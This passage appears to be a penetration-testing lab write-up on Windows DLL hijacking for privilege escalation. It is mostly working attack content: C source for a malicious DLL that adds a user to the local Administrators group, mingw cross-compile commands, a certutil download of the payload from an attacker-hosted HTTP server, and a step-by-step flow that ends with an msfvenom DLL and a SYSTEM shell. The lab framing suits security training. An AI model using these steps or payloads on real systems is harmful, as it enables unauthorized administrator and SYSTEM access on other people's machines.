## Step 6 — Exploitation (Method 2: Custom C DLL — Add User to Admins)

### Get the source code

The lab provides `windows_dll.c` at `C:\Users\User\Desktop\Tools\Source\`

![](attachments/Pasted%20image%2020260924215020.png)

### Transfer to Kali via SMB

On Kali:
```bash
impacket-smbserver share .
```

On Windows:
```cmd
copy windows_dll.c \\<KALI_IP>\share\windows_dll.c
```

![](attachments/Pasted%20image%2020260924215709.png)

### Review the source code

```bash
cat windows_dll.c
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

### Modify the payload

```bash
gedit windows_dll.c
```

Replace the `system()` command:

```c
// Before:
system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");

// After:
system("cmd.exe /k net localgroup administrators user /add");
```

![](attachments/Pasted%20image%2020260924220456.png)

This will add the `user` account to the local **Administrators** group.

### Cross-compile for 64-bit Windows

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

For 32-bit targets:
```bash
i686-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

### Transfer and place the DLL

```bash
python3 -m http.server 8000
```

```cmd
certutil -f -urlcache http://<KALI_IP>:8000/hijackme.dll "C:\Temp\hijackme.dll"
```

![](attachments/Pasted%20image%2020260924221103.png)

> If the service is currently running and the DLL is locked, stop it first via Task Manager (run as admin) or `sc stop dllsvc`.

![](attachments/Pasted%20image%2020260924221201.png)

![](attachments/Pasted%20image%2020260924221301.png)

![](attachments/Pasted%20image%2020260924221332.png)


## Quick Reference — DLL Hijacking Attack Flow

```
1. PowerUp → Invoke-AllChecks                  → Check %PATH% for hijackable locations
2. sc qc <service>                              → Confirm service runs as LocalSystem
3. ProcMon filters:
   - Process Name = <service_exe> → Include
   - Result = NAME NOT FOUND → Include
4. sc start <service>                           → Trigger DLL search events
5. Identify missing DLL name and path           → e.g., C:\Temp\hijackme.dll
6. icacls <directory>                           → Confirm write access
7. msfvenom ... -f dll -o <name>.dll            → Generate payload
8. Place DLL in writable directory              → certutil / copy
9. sc stop <service> & sc start <service>       → Restart service
10. Catch shell → NT AUTHORITY\SYSTEM
```
